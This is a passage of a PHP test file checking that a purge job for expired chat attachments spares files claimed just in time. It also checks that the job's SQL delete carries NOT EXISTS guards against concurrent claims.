    // then claimed, then swept.
    $racer = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'status' => AttachmentStatus::Ready->value,
        'expires_at' => null,
        'original_name' => 'claimed-just-in-time.pdf',
    ]);
    $racer->forceFill(['created_at' => now()->subDays(30)])->save();
    Storage::disk('local')->put($racer->storage_key, 'bytes');

    expect(DB::table('public_chat_message_attachments')->where('attachment_id', $racer->id)->exists())->toBeFalse();

    $this->postJson('/api/v1/public-chat/'.$this->room->code.'/messages', [
        'client_message_id' => (string) Str::uuid(),
        'attachment_ids' => [$racer->id],
    ])->assertStatus(201);

    (new PurgeExpiredUploads)->handle();

    expect(Attachment::withoutGlobalScopes()->whereKey($racer->id)->exists())->toBeTrue();
    expect(Storage::disk('local')->exists($racer->storage_key))->toBeTrue();
});

it('DEC-073 issues the row delete CONDITIONALLY — the guard is in the SQL, not in PHP', function () {
    // The previous test cannot distinguish "the conditional DELETE saved the
    // file" from "the SELECT never returned it", because the claim lands before
    // the job runs. This one looks at the statement itself: the delete must
    // carry the same NOT EXISTS clauses, because that is what makes it block on
    // a concurrent claim's row lock and re-evaluate after it commits — a
    // database guarantee rather than a check, which is the difference between
    // "narrow race" and "closed".
    $orphan = pchatAttachment($this->ws, [
        'public_chat_room_id' => $this->room->id,
        'status' => AttachmentStatus::Ready->value,
        'expires_at' => null,
    ]);
    $orphan->forceFill(['created_at' => now()->subDays(30)])->save();

    $deletes = [];
    DB::listen(function ($query) use (&$deletes) {
        if (str_starts_with(strtolower(ltrim($query->sql)), 'delete from "attachments"')) {
            $deletes[] = strtolower($query->sql);
        }
    });

    (new PurgeExpiredUploads)->handle();

    expect($deletes)->not->toBeEmpty();
    expect($deletes[0])->toContain('not exists')
        ->toContain('public_chat_message_attachments')
        ->toContain('message_attachments')
        ->toContain('room_note_attachments')
        ->toContain('kanban_ticket_attachments');

    expect(Attachment::withoutGlobalScopes()->whereKey($orphan->id)->exists())->toBeFalse();
});
